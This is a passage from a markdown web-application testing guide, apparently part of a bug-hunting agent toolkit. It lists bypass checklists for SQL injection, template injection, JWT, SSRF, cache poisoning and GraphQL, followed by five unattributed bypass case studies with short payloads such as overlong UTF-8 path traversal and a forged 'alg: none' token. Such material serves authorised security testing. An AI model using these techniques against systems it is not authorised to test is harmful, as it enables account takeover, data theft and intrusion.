- [ ] Test multi-byte character encoding quirks (Shift-JIS, ISO-2022-JP)
- [ ] Test charset override parameters in Content-Type

#### Content-Type Encoding
- [ ] Test base64-encoded payload in Content-Type
- [ ] Test quoted-printable encoding in form data
- [ ] Test non-standard charset values

### Template Engine Bypass Checklist

- [ ] Test all template engines the application might use
- [ ] Test restricted variable bypasses (get_flashed_messages, _self, etc.)
- [ ] Test `__class__`, `__mro__`, `__subclasses__` chain
- [ ] Test filter/map/sort function callbacks
- [ ] Test include/import with path traversal
- [ ] Test expression preprocessing (Thymeleaf `__${...}__`)

### SQL Injection Bypass Checklist

- [ ] Test operator substitution (AND→&&, OR→||, =→LIKE→IN→BETWEEN)
- [ ] Test comment injection between keywords (`SEL/**/ECT`)
- [ ] Test alternative whitespace characters (`%09`, `%0A`, `%0C`, `%A0`, backtick)
- [ ] Test MySQL `information_schema` alternatives (`sys`, `mysql.innodb`)
- [ ] Test heavy queries for timing-based blind injection
- [ ] Test protocol-level bypass (SQLi in HTTP headers, body vs URL)

### Cache Poisoning Checklist

- [ ] Identify all unkeyed inputs (headers that affect response but not cache key)
- [ ] Test X-Forwarded-Host / X-Forwarded-Port for URL hijacking
- [ ] Test X-Original-URL / X-Rewrite-URL for path override
- [ ] Test cache deception with static extension appending
- [ ] Test cache key normalization differences between CDN and origin
- [ ] Test separate cache for mobile vs desktop User-Agents

### JWT Attack Checklist

- [ ] Test `alg: none` header
- [ ] Test RS256→HS256 algorithm confusion (public key as HMAC secret)
- [ ] Test JWK injection via `jku` or `jwk` header
- [ ] Test `kid` path traversal for file-based secrets
- [ ] Test `x5u` / `x5c` certificate injection
- [ ] Test `sub` claim manipulation
- [ ] Test cross-service token swap
- [ ] Test weak secret brute force

### SSRF Bypass Checklist

- [ ] Test IP notation variations (decimal, octal, hex, mixed)
- [ ] Test IPv6 loopback and IPv4-mapped IPv6
- [ ] Test DNS rebinding services
- [ ] Test redirect-based SSRF (external → internal)
- [ ] Test protocol smuggling (gopher, dict, file, ftp)
- [ ] Test cloud metadata endpoints (AWS, GCP, Azure)
- [ ] Test DNS-based bypass (nip.io, xip.io, custom domain)
- [ ] Test URL parser differentials

### GraphQL Bypass Checklist

- [ ] Test introspection disabled → field brute-force via errors
- [ ] Test query depth bypass via aliases and fragments
- [ ] Test batch query for rate limit bypass
- [ ] Test recursive fragments for infinite depth
- [ ] Test mutation authorization — does resolver check permissions?
- [ ] Test `__type` fallback when `__schema` is blocked

---

## Real-World Examples

### Example 1: CL.TE Smuggling on Akamai

**Target:** A major e-commerce CDN using Akamai
**Technique:** CL.TE HTTP request smuggling
**Impact:** Cache poisoning for 500k+ users

The Akamai CDN used Content-Length but the origin Nginx used Transfer-Encoding. By sending a CL.TE smuggled request with `X-Forwarded-Host` set to an attacker-controlled domain, static resources (JS/CSS) were cached with the attacker's domain in redirect URLs. All users loading the poisoned cache received redirected resources.

**Bypass chain:** CL.TE smuggling → unkeyed `X-Forwarded-Host` header → cache poisoning

### Example 2: Unicode Normalization WAF Bypass

**Target:** A financial API protected by ModSecurity
**Technique:** Overlong UTF-8 sequence for path traversal
**Impact:** LFI on server-side template rendering

ModSecurity blocked `../` in URL paths. The attacker used overlong UTF-8 for the dots: `%C0%AE%C0%AE/` instead of `../`. ModSecurity decoded `%C0%AE` as invalid UTF-8 (overlong) and skipped the rule. The application (running Python with lenient UTF-8 decoding) normalized it to `../` and loaded file content.

**Bypass chain:** UTF-8 overlong sequence → WAF skips pattern match → LFI

### Example 3: JWT alg: none on Enterprise SSO

**Target:** An enterprise single sign-on provider
**Technique:** JWT algorithm confusion
**Impact:** Full account takeover of any user

The SSO provider used RS256 with proper key management. However, the token introspection endpoint accepted `alg: none`. By sending a JWT with `alg: none` and `sub: victim@company.com`, the introspection endpoint returned `{"active": true}` and the resource server accepted it. The attacker could impersonate any user.

**Bypass chain:** JWT `alg: none` → no signature verification → arbitrary `sub` claim

### Example 4: Content-Type Confusion on GraphQL

**Target:** A social media platform's GraphQL API
**Technique:** JSON → form data Content-Type swap
**Impact:** Rate limit bypass allowing data scraping

The GraphQL rate limiter only inspected `application/json` requests. By sending the same mutation as `application/x-www-form-urlencoded`, the rate limiter didn't count it. The attacker scraped all user email addresses at 10,000+ requests/minute.

**Bypass chain:** Content-Type swap → rate limiter skips form-data → data scraping

### Example 5: Parser Differential in JSON Duplicate Keys

**Target:** A cloud storage API
**Technique:** Duplicate JSON keys with different framework behavior
**Impact:** Privilege escalation to admin

The API used Python's Flask (takes last key) behind an Nginx WAF (checks first key). The attacker sent:
```json
{"role": "user", "role": "admin"}
```
WAF checked `"role": "user"` — valid user role. Flask parsed the last value: `"role": "admin"` — privilege escalation.

**Bypass chain:** JSON duplicate keys → WAF checks first → Flask uses last → admin access

---

## Reference

- [PortSwigger HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [OWASP Testing Guide - Parser Differential](https://owasp.org/www-project-web-security-testing-guide/)
- [JWT.io Debugger](https://jwt.io/)
- [Unicode Normalization Forms (Unicode.org)](https://unicode.org/reports/tr15/)
- [GraphQL Security](https://github.com/dolevf/graphql-security)
- [SSRF Bible](https://github.com/swisskyrepo/SSRFmap)
- [Prototype Pollution Gadgets](https://github.com/BlackFan/client-side-prototype-pollution)
- [SSTI Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- See also: `agents/xss-hunter.md`, `agents/ssrf-hunter.md`, `agents/idor-hunter.md`, `rules/scopes.md`
